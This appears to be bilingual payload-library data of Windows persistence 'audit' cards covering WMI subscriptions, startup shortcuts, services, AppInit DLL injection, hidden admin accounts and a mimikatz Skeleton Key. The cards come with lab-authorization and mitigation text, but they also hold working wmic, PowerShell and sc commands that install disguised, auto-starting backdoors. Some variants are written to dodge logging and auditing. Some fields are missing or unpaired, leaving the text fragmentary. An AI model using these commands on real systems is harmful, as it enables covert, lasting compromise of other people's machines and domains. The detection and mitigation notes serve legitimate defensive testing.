prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 WMI 永久事件订阅持久化审计场景，检验过滤器、消费者与绑定三件套的植入与检测面。验证维度含事件过滤器创建、命令行消费者创建与两者绑定三步，对应第 1 至第 3 步。
overview.en: This payload covers WMI permanent-event-subscription persistence auditing, testing implantation and detection across the filter-consumer-binding triad. Validation covers event-filter creation, command-line consumer creation and their binding, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 WMI 永久订阅以系统权限响应事件且常规巡检极少覆盖 root subscription 命名空间：一次绑定即可在触发条件满足时反复执行攻击者命令。
vulnerability.en: The root cause is permanent subscriptions responding with system privileges while routine checks rarely cover the root subscription namespace: one binding re-executes attacker commands whenever the trigger condition fires.

exploitation.zh: 第 1 步以 Set-WmiInstance 注册名为 evil 的事件过滤器并确认返回实例；第 2 步创建 CommandLineEventConsumer 指向 Base64 解码命令；第 3 步建立 FilterToConsumerBinding 完成绑定，触发对应事件后载荷执行即确认持久化生效。以绑定实例与执行痕迹为成功判据。占位符在全局变量菜单替换；测试后立即删除三件套对象。
exploitation.en: In step 1, register an event filter named evil with Set-WmiInstance and confirm the returned instance. In step 2, create a CommandLineEventConsumer pointing at a Base64-decoded command. In step 3, establish the FilterToConsumerBinding; payload execution on the trigger event confirms persistence. Judge success by the binding instance and execution traces. Replace placeholders via the global variables menu; delete all three objects immediately after testing.

mitigation.zh: 监控 root subscription 命名空间的创建事件（Sysmon 19 至 21），基线比对订阅对象并限制远程 WMI 管理。修复后重放第 1 至第 3 步，每一步都应触发实时告警。
mitigation.en: Monitor creation events in the root subscription namespace (Sysmon 19 through 21), diff subscription objects against baselines, and restrict remote WMI management. After the fix, replay steps 1 through 3: every step should raise real-time alerts.

description.zh: 用 Set-WmiInstance 创建 __EventFilter，以 WQL 监听定时或实例修改事件；返回过滤器实例即埋下持久化的触发条件，周期可自行设定。
description.en: Create an __EventFilter with Set-WmiInstance listening on a WQL timer or modification event; the returned instance plants the persistence trigger.

description.zh: 创建 CommandLineEventConsumer 并指向 Base64 编码的 PowerShell 命令；消费者落成即定义事件触发后执行的动作载荷。
description.en: Create a CommandLineEventConsumer pointing at a Base64-encoded PowerShell command; the consumer defines the action fired when the filter trips.

description.zh: 用 __FilterToConsumerBinding 把前两步的组件绑定；查询到绑定实例即事件订阅持久化生效，系统重启后仍然存活。
description.en: Bind the two components with __FilterToConsumerBinding; once the binding is queryable, the subscription persists across reboots.

analysis.zh: WMI 永久事件订阅审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: WMI Permanent Event-Subscription Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取 root/subscription 中的过滤器、消费者和绑定并关联创建事件，不新建订阅。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command:
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WindowsUpdate",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="WindowsUpdate",CommandLineTemplate="cmd /c C:\Users\Public\backdoor.exe"
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='WindowsUpdate'",Consumer="CommandLineEventConsumer.Name='WindowsUpdate'"

description.zh: 规避 PowerShell Set-WmiInstance 脚本块日志：原生 wmic 三段式建订阅；绑定创建成功即驻留就绪。
description.en: Build the subscription with native wmic three-parter to avoid PowerShell script-block logs; the binding creation completes the persistence.

description.zh: 把事件订阅写进托管对象格式由编译器装载：绕过对 Set-WmiInstance 调用的检测；返回 success 且事件触发即成功。
description.en: Compile a Managed Object Format file to load the subscription, bypassing Set-WmiInstance detection; success plus event triggering confirms it.

title.zh: WMI 类实例 PowerShell 变体

wafBypass.command: powershell -NoProfile -Command "$f=([wmiclass]'root\subscription:__EventFilter').CreateInstance();$f.Name='WindowsUpdate';$f.QueryLanguage='WQL';$f.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\";$f.Put()"

description.zh: 以 [wmiclass] 原生类型替代 Set-WmiInstance cmdlet 特征；对象路径返回即订阅写入。
description.en: Create the filter via the native [wmiclass] type instead of the Set-WmiInstance cmdlet; a returned object path confirms the subscription write.

name.zh: 启动文件夹持久化审计

description.zh: 启动文件夹持久化审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Startup-Folder Persistence Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 启动文件夹持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Startup-Folder Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖启动文件夹持久化审计场景，检验用户级与全用户启动目录的植入触发行为。验证维度含当前用户与所有用户两类启动路径的快捷方式放置，对应第 1 至第 2 步。
overview.en: This payload covers startup-folder persistence auditing, testing implantation and triggering across per-user and all-users startup directories. Validation places shortcuts into both startup paths, mapped to steps 1 and 2.

vulnerability.zh: 根因在于启动目录内文件随登录自动执行且常规基线常遗漏 ProgramData 公共路径：放入恶意快捷方式即可获得用户级乃至全用户登录触发。
vulnerability.en: The root cause is startup-folder files auto-executing at logon while baselines often miss the ProgramData common path: a planted shortcut yields user-level or all-user logon triggers.

exploitation.zh: 第 1 步把测试快捷方式复制进当前用户 Startup 目录，登录后自动运行即确认用户级持久化；第 2 步复制进 ProgramData 全用户 Startup 目录，任意账户登录即触发，记录触发账户以验证作用域。以执行痕迹与登录时间关联为成功判据。占位符在全局变量菜单替换；快捷方式仅执行回显命令，测试后删除。
exploitation.en: In step 1, copy a test shortcut into the current user's Startup folder; auto-execution at next logon confirms user-level persistence. In step 2, copy into the ProgramData all-users Startup folder, triggered by any account logon, recording the triggering account to verify scope. Judge success by execution traces correlated with logon times. Replace placeholders via the global variables menu; let the shortcut run an echo command only and delete it after testing.

mitigation.zh: 把两个启动目录纳入文件完整性监控，普通用户回收 ProgramData 启动目录写权限。修复后重放第 1、2 步，放置应触发告警且无登录执行记录。
mitigation.en: Bring both startup directories under file-integrity monitoring and revoke standard-user write access to the ProgramData startup path. After the fix, replay steps 1 and 2: placement should alert and no logon executions appear.

description.zh: 制作指向后门程序的 evil.lnk 快捷方式并验证后门可独立执行；可附带正常图标与参数降低使用者怀疑，为落地做好准备。
description.en: Craft evil.lnk pointing at the backdoor and verify it runs standalone; a normal icon and arguments keep the shortcut unsuspicious before planting.

description.zh: 把快捷方式复制到当前用户启动文件夹；目录出现文件且重新登录自动执行即完成用户级持久化，无需管理员权限即可落地。
description.en: Copy the shortcut into the user's Startup folder; the file appearing plus execution on next logon completes per-user persistence without admin rights.

title.zh: 扩展到全用户启动目录
title.en: Extend to the all-users Startup folder

description.zh: 把快捷方式复制到 ProgramData 下的所有用户启动文件夹；任意账户登录即触发执行，覆盖面从单用户扩大到全部使用者。
description.en: Copy the shortcut into ProgramData's all-users Startup; every account logon fires it, widening coverage from one user to all of them.

analysis.zh: 启动文件夹持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Startup-Folder Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 列出用户与全局启动目录中的文件、签名和所有者，不复制快捷方式或程序。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 规避对 copy 落文件的监控：COM 对象生成伪装名快捷方式且隐藏窗口；lnk 出现在启动目录即成功。
description.en: Generate a masquerading hidden-window shortcut via COM instead of file copies; the .lnk appearing in Startup confirms success.

description.zh: 以系统风格命名并设置隐藏属性降低目视排查率；文件存在且登录触发即成功。
description.en: Use a system-style name plus hidden attribute to reduce visual triage; the file existing and firing at logon confirms success.

description.zh: 绕过按用户 Profile 路径的监控：落全局启动目录覆盖所有账户；任意用户登录后进程出现即成功。
description.en: Drop into the all-users Startup directory past per-profile monitoring; the process appearing for any user logon confirms success.

name.zh: 服务持久化配置审计

description.zh: 服务持久化配置审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Service Persistence Configuration Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 服务持久化配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Service Persistence Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖服务持久化配置审计场景，检验自启服务创建与启动触发的完整链路。验证维度含 Base64 载荷服务注册与启动执行两步，对应第 1 至第 2 步。
overview.en: This payload covers service-persistence configuration auditing, testing the full chain of autostart service creation and launch triggering. Validation covers registering a Base64-payload service and start execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于服务注册默认要求管理员但常被滥用为合法变更：指向脚本解释器的 binPath 获得开机自启与失败重启的双重触发，隐蔽性高于启动目录。
vulnerability.en: The root cause is service registration requiring administrator yet frequently abused as legitimate change: a binPath pointing at script interpreters gains both boot-start and failure-restart triggers, hiding better than startup folders.

exploitation.zh: 第 1 步用 sc create 注册自启服务 evilsvc，binPath 指向 Base64 解码命令，qc 回读确认创建成功；第 2 步以 sc start 触发执行，服务状态 RUNNING 且载荷命令执行即确认持久化链路完整。以执行痕迹与服务状态为成功判据。占位符在全局变量菜单替换；测试后 sc delete 清理服务。
exploitation.en: In step 1, register autostart service evilsvc with sc create, pointing binPath at a Base64-decoded command, and confirm creation via qc read-back. In step 2, trigger execution with sc start; RUNNING status plus payload execution confirms the persistence chain. Judge success by execution traces and service state. Replace placeholders via the global variables menu; clean up with sc delete after testing.

mitigation.zh: 对服务创建与配置变更启用事件审计（7045、7040）并基线比对服务清单，约束管理员执行来源。修复后重放第 1 步，注册应即时告警并进入审批流程。
mitigation.en: Enable event auditing for service creation and changes (7045, 7040), diff service inventories against baselines, and constrain administrator execution sources. After the fix, replay step 1: registration should alert instantly and enter approval workflow.

description.zh: 把要常驻执行的命令编码为 Base64 形态并验证可独立运行；确定为服务 binPath 的最终载荷，避免命令行特殊字符引发解析问题。
description.en: Base64-encode the resident command and verify it executes standalone; fixing the final binPath payload early avoids parsing surprises in service control.

description.zh: 用 sc create 注册 auto 启动类型的服务，binPath 指向 Base64 编码命令；服务创建成功即写入系统级自启配置，等待开机加载。
description.en: Register an auto-start service with sc create whose binPath runs a Base64 command; creation writes the system-level autostart entry awaiting boot.

title.en: Start the service to verify firing

description.zh: 用 sc start 启动服务；query 显示 RUNNING 且编码命令执行即确认持久化生效，系统重启后仍会自动加载执行。
description.en: Start it with sc start; RUNNING status plus the encoded command executing proves persistence that survives reboots.

analysis.zh: 服务持久化配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Service Persistence Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取自动启动服务的路径、账户、签名和 ACL，不创建或启动服务。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command: powershell -NoProfile -Command "New-Service -Name 'SysUpdate' -BinaryPathName 'cmd /c powershell -e {LAB_BASE64_COMMAND}' -StartupType Automatic -Description 'Windows system update helper'"

description.zh: 规避 sc.exe 命令行审计并以描述伪装：服务创建成功且自启动即驻留生效。
description.en: Create the service via PowerShell with a decoy description past sc.exe auditing; creation with automatic startup confirms persistence.

title.zh: 现有服务 ImagePath 劫持

description.zh: 不新建对象只改既有服务路径：绕过新增服务审计；服务重启后执行载荷即成功。
description.en: Modify an existing service's ImagePath instead of creating one, evading new-object auditing; the payload running on service restart confirms success.

wafBypass.command: sc create "WindowsRemoteManagementUpdater" binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto DisplayName= "Windows Remote Management Updater"

description.zh: 系统风格长名与显示名降低运维目视告警；服务列表出现且 start= auto 即成功。
description.en: A system-style long name lowers visual triage alerts; the service listed with automatic start confirms success.

name.zh: AppInit 与模块注入持久化审计

description.zh: AppInit 与模块注入持久化审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: AppInit and Module-Injection Persistence Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 AppInit 与模块注入持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AppInit and Module-Injection Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 AppInit 与模块注入持久化审计场景，检验全局 DLL 注入机制的配置条件与加载行为。验证维度含载荷生成、AppInit 配置读取与注册表写入三步，对应第 1 至第 3 步。
overview.en: This payload covers AppInit and module-injection persistence auditing, testing configuration conditions and load behavior of global DLL injection. Validation covers payload generation, AppInit configuration reading and registry writing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 AppInit_DLLs 机制对加载 User32 的进程全局生效且仅受少数注册表值约束：开启状态下写入路径即让大量进程加载指定 DLL，形成无文件触发的持久化。
vulnerability.en: The root cause is AppInit_DLLs applying globally to every process loading User32, constrained by only a few registry values: once enabled, a written path makes many processes load the DLL, creating file-trigger-free persistence.

exploitation.zh: 第 1 步用 msfvenom 生成 64 位反向 DLL 作为测试载荷；第 2 步读取 AppInit_DLLs 与 LoadAppInit_DLLs 当前值评估注入条件；第 3 步以 reg add 写入测试 DLL 路径并回读，加载 User32 的进程拉起该 DLL 回连即确认全局注入生效。以监听会话建立为判据。占位符在全局变量菜单替换；测试后恢复注册表值。
exploitation.en: In step 1, generate a 64-bit reverse DLL with msfvenom as the test payload. In step 2, read current AppInit_DLLs and LoadAppInit_DLLs to assess injection conditions. In step 3, write the test DLL path with reg add and read it back; User32-loading processes pulling the DLL and calling back confirm global injection, judged by an established listener session. Replace placeholders via the global variables menu; restore registry values after testing.

mitigation.zh: 保持 LoadAppInit_DLLs 为 0 并要求签名，基线监控该键值变更，同时对可疑 DLL 加载事件告警。修复后重放第 3 步，写入应触发告警且无进程加载测试 DLL。
mitigation.en: Keep LoadAppInit_DLLs at 0 with signing required, baseline-monitor changes to the key, and alert on suspicious DLL load events. After the fix, replay step 3: the write should alert and no process loads the test DLL.

description.zh: 用 msfvenom 生成 64 位反向连接 DLL；本地开启监听等待注入成功后的回连信号，作为全局注入的载荷来源。
description.en: Generate the 64-bit reverse DLL with msfvenom; the local listener waits for the callback once injection lands.

title.zh: 读取 AppInit 配置条件

description.zh: 查询 AppInit_DLLs、LoadAppInit_DLLs 与 RequireSignedAppInit_DLLs 三个键值；Load 为 1 且未强制签名即满足全局注入前提。
description.en: Query AppInit_DLLs, LoadAppInit_DLLs and RequireSignedAppInit_DLLs; Load set to 1 with signing not enforced clears the way for global injection.

title.zh: 写入 AppInit 全局注入

description.zh: 把 AppInit_DLLs 指向第 1 步生成的 evil.dll；此后启动的用户态进程加载该 DLL 并回连，即完成全局模块注入式持久化。
description.en: Point AppInit_DLLs at the step-1 evil.dll; every user-mode process that starts loads it and calls back, achieving global injection persistence.

analysis.zh: AppInit 与模块注入持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AppInit and Module-Injection Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取 AppInit_DLLs、签名策略和模块加载事件，不生成 DLL 或注入进程。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 规避独立后门进程特征：借合法系统进程加载 DLL；导出函数执行副作用出现即成功。
description.en: Load the DLL via the legitimate system process to avoid a standalone backdoor process; side effects of the exported function confirm success.

description.zh: 把恶意 DLL 以应用依赖名放入签名目录借宿主加载；宿主进程加载 version.dll 即成功。
description.en: Place the DLL under an application dependency name in a signed directory; the host loading version.dll confirms success.

description.zh: 内存反射加载避免 LoadLibrary 与注册表痕迹；目标进程模块列表无 DLL 但功能生效即成功。
description.en: Reflectively load in memory to avoid LoadLibrary and registry footprints; functionality working without the DLL listed in the process modules confirms success.

name.zh: 异常本地账号持久化审计

description.zh: 异常本地账号持久化审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Anomalous Local-Account Persistence Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 异常本地账号持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Anomalous Local-Account Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖异常本地账号持久化审计场景，检验管理员组成员的创建路径与隐藏手段。验证维度含常规后门账号、美元后缀隐藏账号与注册表层隐藏三类机制，对应第 1 至第 3 步。
overview.en: This payload covers anomalous local-account persistence auditing, testing creation paths and hiding tricks for Administrators members. Validation covers a regular backdoor account, a dollar-suffixed hidden account and registry-level hiding, mapped to steps 1 through 3.

vulnerability.zh: 根因在于本地账号与组成员管理缺少变更基线：常规巡检只看可见账号列表，美元后缀或注册表键操作即可让账号逃逸枚举，长期保留管理员权限。
vulnerability.en: The root cause is local-account and group-membership management lacking change baselines: routine reviews read only the visible account list, so dollar suffixes or registry-key tricks keep hidden accounts with standing admin rights out of enumeration.

exploitation.zh: 第 1 步创建测试账号并加入管理员组，回读成员列表确认权限到位；第 2 步创建美元后缀账号，验证常规 net user 列表不可见而按名查询可返回；第 3 步操作 SAM Names 注册表键核对注册表层面的隐藏机制与 F 值关联。每步以回读结果为成功判据。占位符在全局变量菜单替换；测试完成后立即删除全部测试账号并导出前后对比。
exploitation.en: In step 1, create a test account, add it to Administrators, and read back membership to confirm privileges. In step 2, create a dollar-suffixed account and verify it is invisible in normal net user listings yet resolvable by name. In step 3, operate the SAM Names registry key to inspect registry-level hiding and F-value linkage. Judge success by read-back results per step. Replace placeholders via the global variables menu; delete all test accounts afterwards and export before/after comparisons.

mitigation.zh: 以基线监控本地账号与管理组成员变更事件（4720、4732），比对机器与域控账号列表差异并检查注册表 Names 键。修复后重放第 1、2 步，创建与加组应即时告警。
mitigation.en: Baseline-monitor local-account and group-membership changes (4720, 4732), diff host versus domain account lists, and inspect registry Names keys. After the fix, replay steps 1 and 2: creation and group additions should alert instantly.

description.zh: 用 net user 添加 backdoor 账户并加入管理员组；回读显示账户存在且在组内即获得持久的提权登录入口。
description.en: Add the backdoor user with net user and drop it into administrators; a readback confirming membership yields a durable privileged login.

description.zh: 创建以美元符结尾的 backdoor 账户；常规 net user 枚举不显示而按名查询可返回，即对日常巡检实现隐身。
description.en: Create the dollar-suffixed account; ordinary net user listings skip it while direct name queries resolve it, hiding it from casual review.

title.en: Reinforce hiding at the registry layer

description.zh: 直接操作 SAM 注册表的 Names 键核对账户项；键可独立读写即把隐藏机制下沉到注册表层面，进一步规避面板与清单检测。
description.en: Manipulate the SAM Names key for the account directly; registry-level control pushes the hiding below what panels and user lists can see.

analysis.zh: 异常本地账号持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只列出本地账号、管理员组和最近账号事件，与批准清单比较，不创建用户。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

name.zh: 隐藏账号与 SAM 异常审计

description.zh: 隐藏账号与 SAM 异常审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 隐藏账号与 SAM 异常审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。

prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖隐藏账号与 SAM 异常审计场景，检验特殊命名账号的创建、提权与注册表痕迹链路。验证维度含隐藏账号创建、管理员组提升与 SAM 键导出回放三步，对应第 1 至第 3 步。

exploitation.zh: 第 1 步创建美元后缀测试账号并确认创建成功；第 2 步将其加入管理员组并回读组清单；第 3 步导出该账号对应 SAM 注册表键再回放导入，观察注册表层面的可见性差异与 RID 关联。以隐藏性验证与组权限回读为成功判据。占位符在全局变量菜单替换；测试后彻底清理账号与注册表残留。
exploitation.en: In step 1, create a dollar-suffixed test account and confirm success. In step 2, add it to Administrators and read back the group list. In step 3, export the account's SAM registry key and replay the import, observing visibility differences and RID linkage at the registry layer. Judge success by hidden-state verification and group read-back. Replace placeholders via the global variables menu; fully remove the account and registry residue after testing.

mitigation.zh: 用注册表直接枚举账号并与 net user 列表比对差异，监控 SAM 键访问与本地组成员变更。修复后重放第 1 步，隐藏账号创建应同时触发进程与注册表告警。
mitigation.en: Enumerate accounts directly from the registry and diff against net user output, monitoring SAM key access and local group changes. After the fix, replay step 1: hidden-account creation should trigger both process and registry alerts.

description.en: Create the dollar-suffixed hidden user with net user; success plus invisibility in normal listings establishes the covert identity.

description.zh: 把隐藏账户加入 administrators 组；组清单出现该账户即获得提权后的隐蔽管理通道，登录即可执行管理员操作。
description.en: Add the hidden user to administrators; its appearance in the group grants a stealthy administrative login path.

title.zh: 导出回放 SAM 键验证

description.zh: 导出该账户对应的 SAM 注册表项并回导入本机；操作成功即在注册表层面固化账号痕迹，规避浅层的用户清单审计。
description.en: Export the account's SAM registry item and re-import it locally; success entrenches the account at registry level, under shallow user-list audits.

description.zh: 在账号已建基础上写登录界面隐藏键：net user 枚举仍可见但登录屏不可见；键值存在且登录屏无该账号即成功。
description.en: Write the logon-screen hiding key after account creation; the value present with the account absent from the logon UI confirms success.

description.zh: cmdlet 建号并同步写隐藏键规避 net.exe 审计；用户清单含号但登录屏不显示即成功。
description.en: Create and hide via cmdlets avoiding net.exe auditing; listed in inventory yet hidden at the logon screen confirms success.

description.en: Create the $-suffixed domain account with a decoy description via dsadd; the AD user object appearing confirms success.

name.zh: Skeleton Key 域控完整性审计

description.zh: Skeleton Key 域控完整性审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

vulnerability.zh: 根因在于可对域控执行代码的攻击者能向 LSASS 注入口令过滤补丁：任意账户随后可用万能口令认证，域内全部身份校验被静默架空且重启即消失。
vulnerability.en: The root cause is code execution on a domain controller enabling LSASS password-filter patching: any account then authenticates with a master password, silently voiding all domain identity checks until reboot.

exploitation.en: In step 1, run mimikatz misc::skeleton on the domain controller; the implant-success notice means the master password is injected into LSASS, then authenticate with any account plus the master password to verify. In step 2, capture LSASS PID, start time and path as a baseline. In step 3, recheck LSASS liveness to confirm the process stayed intact during implantation, recording the comparison. Judge success by master-password authentication succeeding. Replace placeholders via the global variables menu; run only in the authorized lab domain and reboot the DC afterwards to clear it.

mitigation.zh: 收敛域控交互与远程登录来源并启用 Credential Guard，监控 LSASS 完整性与口令过滤器 DLL 加载。修复后重放第 1 步，注入应被阻断且产生最高级别告警。
mitigation.en: Restrict domain-controller logon sources and enable Credential Guard, monitoring LSASS integrity and password-filter DLL loads. After the fix, replay step 1: injection should be blocked with a highest-severity alert.

description.zh: 在域控以 mimikatz 的 misc::skeleton 向 LSASS 注入主密码；返回成功提示即域内任意账户都可用该密码完成域认证。
description.en: On the DC run misc::skeleton to inject the master password into LSASS; success means every domain account now authenticates with it.

title.zh: 留存 LSASS 进程信息

description.zh: 读取 LSASS 进程的编号、启动时间与可执行路径；记录植入时刻的进程参数，用于判断域控重启后后门是否失效。
description.en: Read LSASS's PID, start time and path; anchoring the process state at injection time tells whether a reboot kills the backdoor.

title.zh: 核对进程存活与后门可用
title.en: Confirm process survival and backdoor use

description.zh: 再次列出 LSASS 进程确认未发生重启；主密码仍可登录任意账户即 Skeleton Key 持续生效，形成全域认证后门。
